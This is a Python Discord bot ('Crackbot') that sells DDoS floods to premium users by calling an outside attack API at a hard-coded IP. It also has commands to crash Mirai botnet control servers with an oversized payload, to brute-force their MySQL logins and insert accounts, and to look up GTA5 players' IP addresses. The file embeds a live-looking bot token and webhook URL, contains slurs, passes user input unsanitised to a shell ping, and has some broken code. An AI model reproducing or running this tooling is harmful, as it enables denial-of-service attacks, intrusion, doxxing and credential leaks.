
import os, sys, socket, discord, mmap, random, time, requests 
import base64 as b64
from discord.ext import commands
from discord_webhook import DiscordWebhook



bot_liscense = 'Aurora Official Team'
bot_prefix = '$'
bot_status = "Crack hoes"
DISCORD_TOKEN = ''
ENC_KEY = 'LuxnRadical'

admins = {
    "DEVJWGNXVL5XVLP5R01EZ1LW",
    "E0ZMV2DWVF1XWFX1QKTBA1DT" 

}
rules_list = [
    'Do not ask for free things ',
    'Do not share any accounts.',
    'No racism , homophobia , etc...',
   
]

# flood settings
max_time = 300
attack_methods = [
    "HYDRACOM-KILL",
    "NFO-KILLER",
    "NFO-RX",
    "NFO-X",
    "NFO-ATOM",
    "DEDIPATH",
    
]

# mirai bruter settings
USERNAMES = [
  'root',
  'admin',
  'botnet',
  'booter'
]

PASSWORDS = [
  'root',
  'admin',
  'botnet',
  'booter'
]
#logging system
ticket_webook_url = 'https://discordapp.com/api/webhooks/736623945217736805/NN3Zrm5Gx01q-RBkgTbALSbexUGo5nB0yT0qNkrXs11T9eg9QCNPE5sZebEQ8OUpPpuW'
logs_webhook_url = ''
########################################################################################################
client = commands.Bot(command_prefix = bot_prefix)
client.remove_command('help')

################ HANDLERS ################
@client.event
async def on_ready():
    print("Crack bot ready")
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=bot_status))

@client.event 
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        msg = f'error dumb shit. [{error}]'
    elif isinstance(error, commands.CommandNotFound):
        msg = 'no.'
    elif isinstance(error, commands.MissingRole):
        msg = 'Invalid role.'
    elif isinstance(error, commands.CommandOnCooldown):
        msg = 'Command cooldown please wait.'
    elif isinstance(error, commands.BotMissingRole):
        msg = 'no.'
    elif isinstance(error, commands.CheckFailure):
        msg = 'u cant do that LMAO'
    
    embed = discord.Embed(
    title = 'Command Error',
    description = msg,
    colour = discord.Colour.magenta()
    )
    embed.set_footer(text=f'Command executed by {ctx.author}')

    return await ctx.send(embed=embed)

################ HELP COMMANDS ################
@client.command()
async def admin(ctx):
    await ctx.message.delete()
    embed = discord.Embed(
        title = f'Crackbot [Prefix = {bot_prefix}]',
        colour = discord.Colour.magenta()
    )
    embed.add_field(name='Admin Commands', value=f'''
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    **->** `{bot_prefix}purge [# of messages] ~ Mass deletes message in guild.`
    **->** `{bot_prefix}kick [@member] [reason] ~ Kick a member.`
    **->** `{bot_prefix}ban [@member] [reason] ~ Ban a member.`
    **->** `{bot_prefix}unban [user id] ~ Unban a member.`
    **->** `{bot_prefix}addusr [id] ~ Add a member to premium access.`
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    ''')
    embed.set_footer(text=f'Command executed by {ctx.author}')

    return await ctx.send(embed=embed)

@client.command()
async def tools(ctx):
    await ctx.message.delete()
    embed = discord.Embed(
        title = f'Crackbot [Prefix = {bot_prefix}]',
        colour = discord.Colour.magenta()
    )
    embed.add_field(name='Tools Commands', value=f'''
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    **->** `{bot_prefix}getid ~ Grab your ID.`
    **->** `{bot_prefix}ping ~ Check connection latency between host and discord api.`
    **->** `{bot_prefix}icmp [ip] ~ Ping an IP using ICMP protocol.`
    **->** `{bot_prefix}tcp [ip] [time] ~ Connect to a tcp server.`
    **->** `{bot_prefix}geoip [ip] ~ Get information about an IP/DNS.`
    **->** `{bot_prefix}scrapemirai ~ Get mirai ips from urlhaus. [DEV]`
    **->** `{bot_prefix}cnc_crash [ip] [port] ~ Mirai buffer overflow exploit.`
    **->** `{bot_prefix}cnc_brute [ip] [user] [pass] ~ Mirai MySql dictionary attack.`
    **->** `{bot_prefix}gta5resolv [username] ~ Grab a GTA5 player ip from a database.`
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    ''')
    embed.set_footer(text=f'Command executed by {ctx.author}')

    return await ctx.send(embed=embed)

@client.command()
async def premium(ctx):
    await ctx.message.delete()
    embed = discord.Embed(
        title = f'Crackbot Premium [Prefix = {bot_prefix}]',
        colour = discord.Colour.magenta()
    )
    embed.add_field(name='Premium Commands', value=f'''
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    **->** `{bot_prefix}flood ~ Launch a DDoS attack using our services.`
    **->** `{bot_prefix}methods ~ Display all our available flood methods.`
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    ''')
    embed.set_footer(text=f'Crackbot')

    return await ctx.send(embed=embed)

@client.command()
async def help(ctx):
    await ctx.message.delete()
    embed = discord.Embed(
        title = f'Crackbot [Prefix = {bot_prefix}]',
        colour = discord.Colour.magenta()
    )
    embed.add_field(name='Aurora bot commands', value=f'''
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    **->** `{bot_prefix}admin ~ Display admin commands.`
    **->** `{bot_prefix}tools ~ Display tools commands.`
    **->** `{bot_prefix}premium  ~ Display premium commands.`
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    ''')
    embed.set_footer(text=f'Command executed by {ctx.author}')

    return await ctx.send(embed=embed)

################ COMMANDS ################
@client.command()
async def ping(ctx):
    embed = discord.Embed(
    title = 'Bot Latency Test',
    description = f'Pong [{round(client.latency * 1000)}ms]',
    colour = discord.Colour.magenta()
    )
    embed.set_footer(text=f'Command executed by {ctx.author}')

    return await ctx.send(embed=embed)


@client.command()
@commands.has_permissions(administrator = True)
async def purge(ctx, amount):
    msg = 'None'
    if int(amount) > 500:
        msg = f'{amount} is not a valid amount of messages to delete (min=1 max=500)'
    else:
        await ctx.channel.purge(limit=int(amount))
        msg = f'Purged {amount} messages'
    embed = discord.Embed(
    title = 'Purge',
    description = msg,
    colour = discord.Colour.magenta()
    )
    embed.set_footer(text=f'Command executed by {ctx.author}')

    return await ctx.send(embed=embed)


@client.command()
@commands.has_permissions(kick_members = True)
async def kick(ctx, member : discord.Member, *, reason=None):
    msg = 'None'
    if member == None or member == ctx.message.author:
        msg = f'Error banning kicking [{member}]. Invalid member'

    try:
        await member.kick(reason=reason)
        msg = f'{member} has been kicked for the reason [{reason}]'
    except Exception as ex:
        msg = f'Error kicking member [{member}]. {ex}'

    embed = discord.Embed(
    title = 'Kick',
    description = msg,
    colour = discord.Colour.magenta()
    )
    embed.set_footer(text=f'Command executed by {ctx.author}')
    return await ctx.send(embed=embed)


@client.command()
@commands.has_permissions(ban_members = True)
async def ban(ctx, member : discord.Member, *, reason=None):
    msg = 'None'
    if member == None or member == ctx.message.author:
        msg = f'Error banning member [{member}]. Invalid member'
    else:
        try:
            await member.ban(reason=reason)
            msg = f'{member} has been banned for the reason [{reason}]'
        except Exception as ex:
            msg = f'Error banning member [{member}]. {ex}'

    embed = discord.Embed(
    title = 'Ban',
    description = msg,
    colour = discord.Colour.magenta()
    )
    embed.set_footer(text=f'Command executed by {ctx.author}')
    return await ctx.send(embed=embed)


@client.command()
@commands.has_permissions(administrator = True)
async def unban(ctx, id):
    msg = 'None'
    user = await client.fetch_user(int(id))
    try:
        await ctx.guild.unban(user)
        msg = f'{id} has been unbanned'
    except Exception as ex:
        msg = f'Error unbanning member [{id}]. {ex}'

    embed = discord.Embed(
    title = 'Unban',
    description = msg,
    colour = discord.Colour.magenta()
    )
    embed.set_footer(text=f'Command executed by {ctx.author}')
    return await ctx.send(embed=embed)


@client.command()
async def icmp(ctx, ip):
    msg = 'None'
    try:
        msg = os.popen(f'ping -n 3 -w 1 {ip}').read().strip()
    except Exception:
        msg = f'Error pinging the IP'


    embed = discord.Embed(
    title = 'ICMP Ping',
    description = msg,
    colour = discord.Colour.magenta()
    )
    embed.set_footer(text=f'Command executed by {ctx.author}')
    return await ctx.send(embed=embed)


@client.command()
async def tcp(ctx, ip, port):
    msg = ''
    if tcp_conn(ip,port):
        msg = f'Connected to {ip}:{port}. (Port is open and receiving connections)'
    else:
        msg = f'Timeout on {ip}:{port}'
    
    embed = discord.Embed(
    title = 'TCP Check',
    description = msg,
    colour = discord.Colour.magenta()
    )
    embed.set_footer(text=f'Command executed by {ctx.author}')

    return await ctx.send(embed=embed)


def tcp_conn(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    try:
        s.connect((ip,int(port)))
        s.close()
        return True
    except:
        return False

@client.command()
@commands.cooldown(1, 15, commands.BucketType.user)
async def cnc_crash(ctx, ip, port):
    msg = 'none'

    if send_cnc_crash(ip, port):
        msg = f'Send crashing payload [{ip}:{port}]'
    else:
        msg = f'Error sending payload [{ip}:{port}]'
    
    embed = discord.Embed(
    title = 'CnC Crasher',
    description = msg,
    colour = discord.Colour.magenta() 
    )
    embed.set_footer(text=f'Command executed by {ctx.author}')

    return await ctx.send(embed=embed)

def send_cnc_crash(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, int(port)))
        s.send(b'A'*2000)
        s.close
        return True
    except:
        return False


def TryConnect(ip:str,username:str,password:str):
    '''
    just connect to the mysql server using mysql.connector and return true if no error is thrown
    '''

    try:

        conn = mysql.connector.connect(user=username, password=password, host=ip)
        conn.close()
        return True

    except mysql.connector.Error as err:

        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR: # if error code is catched (failed password)
            return False

def GetDatabases(ip:str, username:str, password:str):
    '''
    connect to the mysql database and run the query (SHOW DATABASES) and save every single line (reponse) to an array
    '''
    conn = mysql.connector.connect(user=username, password=password, host=ip)
    cursor = conn.cursor()

    query = ("SHOW DATABASES;")

    cursor.execute(query)

    for (databases) in cursor:
        DBS.append(databases[0])
        
    conn.close()
    cursor.close()

def ExecMiraiAddUser(ip:str, mysqluser:str, mysqlpass:str, mysqldata:str, adduser:str, addpass:str):
    '''
    - execute a insert query (for mirai database)
    '''
    try:

        conn = mysql.connector.connect(user=mysqluser, password=mysqlpass, host=ip)
        cursor = conn.cursor()

        query = f"INSERT INTO users VALUES(NULL, ""{adduser}"", ""{addpass}"", 0, 0, 0, 0, -1, 1, 30, '')"

        cursor.execute(query)

        conn.commit()

        return True


    except mysql.connector.Error as err:
        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR: # if error code is catched (failed password)
            return False

@client.command()
@commands.cooldown(1, 15, commands.BucketType.user)
async def cnc_brute(ctx,ip,username,password):
    DBS = []
    msg = ''

    if not CheckMysql(ip):
        return await ctx.send(f'```Host doesn`t have a MySQL Database.```')

    t = time.localtime()
    current_time = time.strftime("%H:%M:%S", t)

    msg = f'Started bruting on host [{ip}] at [{current_time}]\n'
    for user in USERNAMES:
        for passw in PASSWORDS:
            if TryConnect(ip, user,passw):
                msg += f'Successfully bruted [{user}:{passw}]\n'
                GetDatabases(ip,user,passw) # get all dbs from host and add them to an array

                for datab in DBS: # execute the mysql query on target host/database
                
                    if "information_schema" in datab:
                        continue

                    if ExecMiraiAddUser(ip, user, passw, datab, username, password):
                        msg += f'Inserted new user [{datab}]\n'
                    else:
                        msg += f'Error inserting new user [{datab}]\n'


            else:
                msg += f"Failed bruting [{user}:{passw}]\n"
    

    embed = discord.Embed(
        title = 'Mirai CnC Bruter',
        description = msg,
        colour = discord.Colour.magenta()
    )
    embed.set_footer(text=f'Command executed by {ctx.author}')
    return await ctx.send(embed=embed)       
    


def CheckMysql(ip:str):
    '''
    connect to the ip with 3306 port
    '''

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5) # man fuck ur waiting

    try:
        s.connect((ip,3306))
        return True

    except:
        return False

@client.command()
async def gta5resolv(ctx, username):
    msg = 'API Error'
    try:
        msg = requests.get(f'http://pikey.shop/stresscity_gta5/{username}.ini').text
    except:
        msg = 'Username not found'

    if 'Object not found!' in msg:
        msg = 'Username not found'
    
    embed = discord.Embed(
    title = 'PC GTA5 Resolver',
    description = msg,
    colour = discord.Colour.magenta()
    )
    embed.set_footer(text=f'Command executed by {ctx.author}')
    return await ctx.send(embed=embed)

@client.command()
async def geoip(ctx, ip):
    try:
        response2 = requests.get("https://w3c.github.io/geolocation-api/" + ip)
        data1 = response2.json()
        whois_country = data1["country"]
        whois_count_code = data1["countryCode"]
        whois_region = data1["region"]
        whois_regionName = data1["regionName"]
        whois_city = data1["city"]
        whois_zip = data1["zip"]
        whois_lat = str(data1["lat"])
        whois_lon = str(data1["lon"])
        whois_timezone = str(data1["timezone"])
        whois_isp = data1["isp"]
        whois_org = data1["org"]
    except:
        await ctx.send("```Error contacting the GeoIP API.```")
        return

    embed = discord.Embed(
    title = 'GeoIP',
    description = f'''
    [Host] ~> {ip}
    [Country] ~> {whois_country}
    [Country Code] ~> {whois_count_code}
    [Region] ~> {whois_region}
    [Region Name] ~> {whois_regionName}
    [City] ~> {whois_city}
    [ZIP] ~> {whois_zip}
    [LAT] ~> {whois_lat}
    [LON] ~> {whois_lon}
    [Time Zone] ~> {whois_timezone}
    [ISP] ~> {whois_isp}
    [Organisation] ~> {whois_org}
    ''',
    colour = discord.Colour.magenta()
    )
    embed.set_footer(text=f'Command executed by {ctx.author}')

    return await ctx.send(embed=embed)


@client.command()
async def getid(ctx):
    author_key = xor_enc(str(ctx.author.id), ENC_KEY).upper()
    embed = discord.Embed(
    title = 'Crack Prem ID',
    description = f'[{ctx.author}] PREM ID : {author_key}',
    colour = discord.Colour.magenta()
    )
    embed.set_footer(text=f'Command executed by {ctx.author}')
    return await ctx.send(embed=embed)


@client.command()
async def addusr(ctx, userid):
    msg = 'Error'
    author_key = xor_enc(str(ctx.author.id), ENC_KEY).upper()
    if author_key in admins:
        file_object = open('valid_id.txt', 'a')
        file_object.write(f'\n'+userid.upper())
        file_object.close()
        msg = f'Added {userid.upper()} to database of premium users.'
    else:
        msg = "You don't have access. (Admin users only)"
    
    embed = discord.Embed(
    title = 'Adduser Premium',
    description = msg,
    colour = discord.Colour.magenta()
    )
    embed.set_footer(text=f'Command executed by {ctx.author}')

    return await ctx.send(embed=embed)


@client.command()
async def rules(ctx):
    msg = ""
    for x in rules_list:
        msg += '**->** '+x+'\n'

    embed = discord.Embed(
    title = 'Rules',
    description = msg,
    colour = discord.Colour.magenta()
    )
    embed.set_footer(text=f'Command executed by {ctx.author}')

    await ctx.send(embed=embed)
    return


@client.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def ticket(ctx,*,message):
    author_key = xor_enc(str(ctx.author.id), ENC_KEY).upper()
    msg = ''
    if usrcheck(author_key):
        report_to_webook(ticket_webook_url, f'Ticket by [{ctx.author}:{author_key}]: {message}')
        msg = f'Successfully sent a support ticket !'
    else:
        msg = f'You need to be premium to have access to this command.'

    embed = discord.Embed(
    title = 'Support Ticket',
    description = msg,
    colour = discord.Colour.magenta()
    )
    embed.set_footer(text=f'Command executed by {ctx.author}')

    return await ctx.send(embed=embed)
    
def report_to_webook(wurl, wmsg):
    webhook = DiscordWebhook(url=wurl, content=wmsg)
    return webhook.execute()


@client.command()
async def methods(ctx):
    msg = ""
    for x in attack_methods:
        msg += f'**{x}**\n'

    embed = discord.Embed(
    title = 'Attack Methods',
    description = msg,
    colour = discord.Colour.magenta()
    )
    embed.set_footer(text=f'Command executed by {ctx.author}')

    return await ctx.send(embed=embed)

@client.command()
@commands.cooldown(1, 40, commands.BucketType.user)
async def flood(ctx, ip, port, time, method):
    msg = 'Error'
    author_key = xor_enc(str(ctx.author.id), ENC_KEY).upper()
    
    try:
        if usrcheck(author_key):
            if(int(time) <= max_time):
                if validate_port(port):
                    if validate_time(time):
                        if executeflood(method, ip, time, port):
                            msg = f'Flood started on {ip}:{port} using {method} for {time} sec.'
                        else:
                            msg = 'Error sending attack (Cooldown/Anti-Spamming).'
                    else:
                        msg = f'Invalid time format.'
                else:
                    msg = f'Invalid port format.'
            else:
                msg = f'Attack time too long. ({max_time} is max).'
        else:
            msg = f'You need to be premium to have access to this command.'
    except:
        msg = 'Error parsing flood duration (int).'


    embed = discord.Embed(
    title = 'Flood',
    description = msg,
    colour = discord.Colour.magenta() 
    )
    embed.set_footer(text=f'Command executed by {ctx.author}:{author_key}')

    return await ctx.send(embed=embed)


def usrcheck(usrid):
	with open('valid_id.txt', 'rb', 0) as file, mmap.mmap(file.fileno(), 0, access=mmap.ACCESS_READ) as s:
		if s.find(usrid.encode()) != -1:
			return True


def executeflood(vec: str, target: str, timestamp: str, port: str):
    api1 = "http://185.172.110.189/qbot.php?key=blackniggers1337&host=%s&port=%s&time=%s&type=%s" %(target, port, timestamp, vec)
    api2 = "Penis69420?host=%s&port=%s&time=%s&method=%s&vip=Yes"%(target, port, timestamp, vec)

    try:
        attack_req1 = requests.get(api1).text
        attack_req2 = requests.get(api2).text
        return True
    except:
        return False


def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535


def validate_time(time):
    return time.isdigit()


def xor_enc(string,key):
	lkey=len(key)
	secret=[]
	num=0
	for each in string:
		if num>=lkey:
			num=num%lkey
		secret.append( chr( ord(each)^ord(key[num]) ) )
		num+=1

	return b64.b64encode( "".join( secret ).encode() ).decode()


def xor_dec(string,key):
	leter = b64.b64decode( string.encode() ).decode()
	lkey=len(key)
	string=[]
	num=0
	for each in leter:
		if num>=lkey:
			num=num%lkey

		string.append( chr( ord(each)^ord(key[num]) ) )
		num+=1

	return "".join( string )

##### Token stealer LUX IS A SKID



client.run("ODAzNzg1OTYxOTQ2NDgwNjYw.YBC2Ag.0oU7VBQCpvE6GFb8y8Wb7iQ6AbU") # super hacking thing
